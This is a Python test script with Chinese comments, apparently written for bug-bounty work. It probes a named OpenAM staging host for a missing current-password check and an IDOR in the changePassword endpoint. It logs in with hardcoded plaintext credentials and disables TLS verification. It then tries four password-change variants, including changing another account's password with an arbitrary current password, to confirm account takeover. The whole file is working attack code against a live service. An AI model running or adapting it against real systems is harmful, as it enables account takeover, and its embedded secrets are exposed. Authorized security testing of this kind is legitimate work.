# -*- coding: utf-8 -*-
"""AIC 第五十七轮:currentpassword 校验决定性测试
上轮信号:他人 ID changePassword 400 缺 currentpassword(权限检查放行!);
   自己 changePassword 全部 400 缺 currentpassword(字段名确认)。
本轮(决定性):
A. 自己 + 错误 currentpassword -> 若 200=校验缺失(会话即可改密码,高危)
B. 自己 + 正确 currentpassword -> 200 且新密码可登录(基线确认)
C. 他人(regtest1644,我自己注册的账号,密码已知)+ 正确 currentpassword
   -> 若 200=action 无 IDOR(但需旧密码,无洞);若 400=有 IDOR 检查
D. 他人 + 任意 currentpassword -> 若 200=任意账号接管(Critical!)
预期结果表:
  成立(Critical) -> D 或 A 成功:currentpassword 不校验
  成立(无洞)     -> 错误 currentpassword 400,正确 200(需旧密码,IDOR 无意义)
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
NEWPASS = 'PccpChanged2026!x'
REG1644_PASS = 'RegTest1644!x'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

def login(u=USER, p=PASS):
    r = S.post(AUTH, json={}, timeout=15, verify=False)
    d = r.json()
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    return r2.json().get('tokenId')

tok = login()
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

UP = BASE + '/am/json/realms/root/realms/alpha/users/%s?_action=changePassword'

print('\n=== A. 自己 + 错误 currentpassword ===')
r = S.post(UP % MY_ID, json={'currentpassword': 'TotallyWrong!', 'userpassword': NEWPASS}, timeout=12, verify=False)
print('错误 currentpassword -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !!!! 校验缺失! 新密码登录验证:')
    print('  登录: %s' % ('SUCCESS' if login(p=NEWPASS) else 'FAILED'))
    S.post(UP % MY_ID, json={'currentpassword': 'TotallyWrong!', 'userpassword': PASS}, timeout=12, verify=False)
    print('  已改回')

print('\n=== B. 自己 + 正确 currentpassword ===')
r = S.post(UP % MY_ID, json={'currentpassword': PASS, 'userpassword': NEWPASS}, timeout=12, verify=False)
print('正确 currentpassword -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  新密码登录: %s' % ('SUCCESS' if login(p=NEWPASS) else 'FAILED'))
    S.post(UP % MY_ID, json={'currentpassword': NEWPASS, 'userpassword': PASS}, timeout=12, verify=False)
    tok4 = login()
    print('  改回+原密码恢复: %s' % ('OK' if tok4 else 'FAILED!'))

print('\n=== C. 他人(regtest1644) + 正确 currentpassword ===')
r = S.post(UP % 'regtest1644', json={'currentpassword': REG1644_PASS, 'userpassword': NEWPASS}, timeout=12, verify=False)
print('regtest1644 正确 cp -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !! 他人 changePassword 成功! 新密码登录验证:')
    print('  登录: %s' % ('SUCCESS' if login(u='regtest1644', p=NEWPASS) else 'FAILED'))
    S.post(UP % 'regtest1644', json={'currentpassword': NEWPASS, 'userpassword': REG1644_PASS}, timeout=12, verify=False)
    print('  已改回')

print('\n=== D. 他人 + 任意 currentpassword ===')
r = S.post(UP % 'regtest1644', json={'currentpassword': 'Arbitrary123!', 'userpassword': NEWPASS}, timeout=12, verify=False)
print('regtest1644 任意 cp -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !!!!!! 任意账号接管! 登录验证:')
    print('  登录: %s' % ('SUCCESS' if login(u='regtest1644', p=NEWPASS) else 'FAILED'))
    S.post(UP % 'regtest1644', json={'currentpassword': NEWPASS, 'userpassword': REG1644_PASS}, timeout=12, verify=False)
    print('  已改回')
